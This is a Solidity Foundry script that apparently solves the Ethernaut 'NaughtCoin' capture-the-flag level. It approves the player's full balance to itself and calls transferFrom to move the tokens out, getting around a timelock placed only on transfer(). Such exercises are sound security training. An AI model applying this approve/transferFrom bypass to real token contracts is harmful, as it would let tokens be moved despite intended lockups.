// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import {Script, console} from "forge-std/Script.sol";
import {Broadcast} from "./helper/Broadcast.sol";
import {NaughtCoin} from "../src/L15NaughtCoin.sol";

contract L15NaughtCoinAttack is Script, Broadcast {
    NaughtCoin naughtCoin = NaughtCoin(0x2b961E3959b79326A8e7F64Ef0d2d825707669b5);
    address MY_ADDRESS = 0xf39Fd6e51aad88F6F4ce6aB8827279cffFb92266;
    address TO_ADDRESS = 0x86E26DC295d7c11FF54a39aA3420E3F163581D0c;
    uint256 myBalance = naughtCoin.balanceOf(MY_ADDRESS);

    function run() public broadcast {
        bool approved = naughtCoin.approve(address(MY_ADDRESS), myBalance);
        require(approved, "Approved failed");

        naughtCoin.transferFrom(MY_ADDRESS, TO_ADDRESS, myBalance);
        console.log("After transfer", myBalance);
    }
}
